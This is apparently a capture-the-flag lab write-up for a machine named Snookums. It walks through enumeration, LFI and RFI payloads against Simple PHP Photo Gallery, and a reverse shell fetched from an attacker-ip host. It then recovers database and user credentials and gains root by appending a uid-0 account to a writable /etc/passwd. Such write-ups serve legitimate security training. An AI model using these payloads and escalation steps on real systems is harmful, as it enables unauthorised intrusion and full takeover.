---
description: Privilege Escalation via writable /etc/passwd
icon: linux
---

# Snookums

## Summary

* FTP allowed anonymous login but directory listing failed.
* Apache server hosted vulnerable **Simple PHP Photo Gallery v0.8**.
* LFI and RFI exploits led to remote code execution via PHP reverse shell.
* MySQL `DBPASS` for root found in webroot PHP config.
* Credentials for local users recovered via double base64 decoding from MySQL.
* Privilege escalation achieved by abusing write access to `/etc/passwd`.

***

## 🧵 Let's Unpack

#### 🔎 Enumeration

```bash
nmap -p- 192.168.167.58
sudo nmap -A -T4 -sC -sN -oN nmapFull -p 21,22,80,111,139,445,3306,33060 192.168.167.58
```

* **FTP**: `vsftpd 3.0.2` allowed anonymous login (but no directory listing)
* **HTTP**: Apache 2.4.6 hosted **Simple PHP Photo Gallery v0.8**
* **MySQL** open on `3306` (unauth)
* **Samba**, **RPCBind**, and **SSH** present

#### ⚡ Initial Foothold

* Exploited [EDB-7786](https://www.exploit-db.com/exploits/7786) on `Simple PHP Photo Gallery`
* Used LFI to read `/etc/passwd` and RFI to execute PHP shell

```bash
# LFI
index.php?preview=box.png%00../../../../../../../../../../../../etc/passwd%00

# RFI
image.php?img=http://<attacker-ip>/reverse_shell.php
```

* Reverse shell connection received, gained shell access

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### 🔐 Credential Extraction

* Found `db_config.php` in `/var/www/html`:

```php
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
```

* Logged into MySQL using:

```bash
mysql -u root -p

>
show databases;
use <tableName>
show tables;

select * from tables;
# got creds of 3 users
+----------+----------------------------------------------+
| username | password                                     |
+----------+----------------------------------------------+
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
+----------+-------------------------------------------

# Decoding password;
SELECT username, CONVERT(FROM_BASE64(password), CHAR) FROM users;

```

* Extracted user credentials from `users` table (double base64 encoded):

```sql
SELECT username, CONVERT(FROM_BASE64(FROM_BASE64(password)), CHAR) FROM users;

michael: HockSydneyCertify123
josh: MobilizeHissSeedtime747
serena: OverallCrestLean000
```

* Decoded credentials:
  * michael : `HockSydneyCertify123`
  * josh : `MobilizeHissSeedtime747`
  * serena : `OverallCrestLean000`
* SSH login as `michael` successful

#### 🪜 Privilege Escalation

* `michael` had **write access to `/etc/passwd`**
* Added root user manually using crafted password hash:

```bash
openssl passwd -1 -salt dhawan dhawan1337
# $1$dhawan$XHPP5JzvM1sM17BmwzpJ31

echo 'dhawan:$1$dhawan$XHPP5JzvM1sM17BmwzpJ31:0:0::/root:/bin/bash' >> /etc/passwd
su dhawan
# Password: dhawan1337
```

* Gained root shell 🎉

***

###
